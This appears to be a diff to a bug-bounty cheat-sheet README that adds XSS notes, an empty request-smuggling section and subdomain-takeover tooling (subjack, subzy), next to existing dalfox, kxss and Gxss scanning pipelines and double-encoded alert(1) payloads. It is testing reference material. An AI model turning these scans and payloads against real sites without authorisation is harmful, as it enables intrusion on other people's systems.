@@ -155,6 +155,22 @@
 -----------------------------------------------------------------------------
 
 <details>
+	<summary>HTTP Request Smuggling</summary>
+
+	
+
+
+
+
+
+
+
+ 
+</details>
+
+-----------------------------------------------------------------------------
+
+<details>
 	<summary>RCE</summary>
 
 	1- Injection in json file 
@@ -264,6 +280,7 @@
 	dalfox url "https://target.com/?q=search" -o dalfox_xss.txt
 	dalfox file allParam.txt --waf-evasion --user-agent 'Mozilla/5.0 (x11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 			Safari/537.36' --proxy 'http://127.0.0.1:8080' --timeout 30 -b 'payload from xss.report' -o xssProbability.txt --deep-domxss 
 
+	-----------------------------------------------------------------------------------------------
 	
 	echo "domain.com" | gau | kxss | grep ">"
 	
@@ -272,19 +289,29 @@
 	
 	echo "sub.domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
 	
+	-----------------------------------------------------------------------------------------------
 	
 	cat domain.txt | kxss | grep "\" ' < >" | tee kxss.txt
 	
 	cat domain.txt | kxss
 
+	-----------------------------------------------------------------------------------------------
 
 	Double Decode :
  		%2527%2520onmouseover%253D%2527alert%25281%2529%2527%2520
    		%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520autofocus%253D%2527
      		%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520
        		%2527%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
-   		
-    
+
+	-----------------------------------------------------------------------------------------------
+  	- Click "Live chat" and send a chat message. 
+	Itercept the request 
+	edit message to <img src=1 onerror='alert(1)'>
+	   		
+    	-----------------------------------------------------------------------------------------------
+
+
+
 </details>
 
 
@@ -320,9 +347,15 @@
 
 -----------------------------------------------------------------------------
 
+<details>
+	<summary>Subdomain Takeover</summary>
 
+	- subjack -w <Subdomain List> -o results.txt -ssl -c fingerprints.json
+ 	- subzy 
 
-
+   	
+ 
+</details>
 
 -----------------------------------------------------------------------------
 
